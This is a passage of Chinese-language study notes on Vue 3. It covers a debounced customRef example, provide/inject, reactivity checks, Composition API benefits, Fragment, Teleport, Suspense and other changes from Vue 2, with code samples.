							console.log(`有人从myRef这个容器中读取数据了，我把${value}给他了`)
							track() //通知Vue追踪value的变化（提前和get商量一下，让他认为这个value是有用的）
							return value
						},
						set(newValue){
							console.log(`有人把myRef这个容器中数据改为了：${newValue}`)
							clearTimeout(timer)
							timer = setTimeout(()=>{
								value = newValue
								trigger() //通知Vue去重新解析模板
							},delay)
						},
					}
				})
			}
			// let keyWord = ref('hello') //使用Vue提供的ref
			let keyWord = myRef('hello',500) //使用程序员自定义的ref
			
			return {keyWord}
		}
	}
</script>
```

# provide和inject

<img src="https://v3.cn.vuejs.org/images/components_provide.png" style="width:300px" />

- 作用：实现祖与后代组件间通信,父子之间通信使用更简单的props即可
- 实现：父组件有一个`provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据

```vue
<!-- 祖组件 -->
<template>
	<div class="app">
		<h3>我是App组件，{{name}}--{{price}}</h3>
		<Child/>
	</div>
</template>

<script>
	import { reactive,toRefs,provide } from 'vue'
	import Child from './components/Child.vue'
	export default {
		name:'App',
		components:{Child},
		setup(){
			let car = reactive({name:'奔驰',price:'40W'})
			provide('car',car) //给自己的后代组件传递数据
			return {...toRefs(car)}
		}
	}
</script>

```

```vue
<!-- 后代组件 -->
<template>
	<div class="son">
		<h3>我是Son组件（孙），{{car.name}}--{{car.price}}</h3>
	</div>
</template>

<script>
	import {inject} from 'vue'
	export default {
		name:'Son',
		setup(){
			let car = inject('car')
			return {car}
		}
	}
</script>

```

# 响应式数据的判断

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
- isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
- isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

```vue
<script>
	import {ref,reactive,toRefs,readonly,isRef,isReactive,isReadonly,isProxy} from 'vue'
	export default {
		name:'App',
		setup(){
			let car = reactive({name:'奔驰',price:'40W'})
			let sum = ref(0)
			let car2 = readonly(car)

			console.log(isRef(sum))
			console.log(isReactive(car))
			console.log(isReadonly(car2))
			console.log(isProxy(car))
      console.log(isProxy(car2))//true:值得注意的是,readonly包裹之前是什么类型的对象,被包裹之后并不会改变
			console.log(isProxy(sum))
			return {...toRefs(car)}
		}
	}
</script>
```

# Compositions的优势

传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改

<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f84e4e2c02424d9a99862ade0a2e4114~tplv-k3u1fbpfcp-watermark.image" style="width:530px;float:left" /><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5ac7e20d1784887a826f6360768a368~tplv-k3u1fbpfcp-watermark.image" style="zoom:50%;width:530px;left" />

Composition API的优势:可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起

<img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bc0be8211fc54b6c941c036791ba4efe~tplv-k3u1fbpfcp-watermark.image" style="height:290px;float:left"/><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6cc55165c0e34069a75fe36f8712eb80~tplv-k3u1fbpfcp-watermark.image" style="height:290px;float:left"/>

# Fragment

- 在Vue2中: 组件必须有一个根标签
- 在Vue3中: 组件可以没有根标签,内部会将多个标签包含在一个Fragment虚拟元素中,不需要引入,是vue3自动添加的看,并且也只能再vue开发者工具中看到
- 好处: 减少标签层级, 减小内存占用

# Teleport

`Teleport`:一种能够将我们的组件html结构移动到指定位置的技术

```vue
<teleport to="移动位置">
	<div v-if="isShow" class="mask">
		<div class="dialog">
			<h3>我是一个弹窗</h3>
			<button @click="isShow = false">关闭弹窗</button>
		</div>
	</div>
</teleport>
```

# Suspence

1. 异步渲染组件可以让先加载好的组件先在页面上被渲染,之后被渲染完成的页面再一一加载,否则多个页面中只要有一个没有加载完成,那么用户看到的就始终会是空白页面
2. 等待异步组件时渲染一些额外内容，让应用有更好的用户体验,否则用户不知道页面是否加载完成

```vue
<template>
	<div class="app">
		<h3>我是App组件</h3>
		<Suspense><!-- 必须使用Suspence标签包裹 -->
			<template v-slot:default>
				<Child/>
			</template>
			<template v-slot:fallback>
				<h3>稍等，加载中...</h3>
			</template>
		</Suspense>
	</div>
</template>

<script>
	// import Child from './components/Child'//静态引入
	import {defineAsyncComponent} from 'vue' 
	const Child = defineAsyncComponent(()=>import('./components/Child')) //异步引入
	export default {
		name:'App',
		components:{Child},
	}
</script>
```

# vue3中的其它改变

- vue3对vue2中的一些全局API做了改变,将全局的API即：```Vue.xxx```调整到应用实例```app```上

| 2.x 全局 API（```Vue```） | 3.x 实例 API (`app`)        |
| ------------------------- | --------------------------- |
| Vue.config.xxxx           | app.config.xxxx             |
| Vue.config.productionTip  | 移除                        |
| Vue.component             | app.component               |
| Vue.directive             | app.directive               |
| Vue.mixin                 | app.mixin                   |
| Vue.use                   | app.use                     |
| Vue.prototype             | app.config.globalProperties |

- data选项应始终被声明为一个函数
- 过渡类名的更改

```css
/* vue2写法 */
.v-enter,
.v-leave-to {
  opacity: 0;
}
.v-leave,
.v-enter-to {
  opacity: 1;
}
```

```css
/* vue3写法 */
.v-enter-from,
.v-leave-to {
  opacity: 0;
}

.v-leave-from,
.v-enter-to {
  opacity: 1;
}
```

- 移除keyCode作为v-on的修饰符,同时也不再支持```config.keyCodes```
- 移除```v-on.native```修饰符

```vue
<!-- 父组件中绑定事件 -->
<my-component
  v-on:close="handleComponentEvent"
  v-on:click="handleNativeClickEvent"
/>
<!-- 子组件中声明自定义事件 -->
<script>
  export default {
    emits: ['close']//如果接收click则表明click为自定义事件,否则即为原生事件
  }
</script>
```

- 移除过滤器`filter`:过滤器虽然这看起来很方便,但它需要一个自定义语法,打破大括号内表达式是 “只是 JavaScript”的假设,这不仅有学习成本,而且有实现成本!建议用方法调用或计算属性去替换过滤器
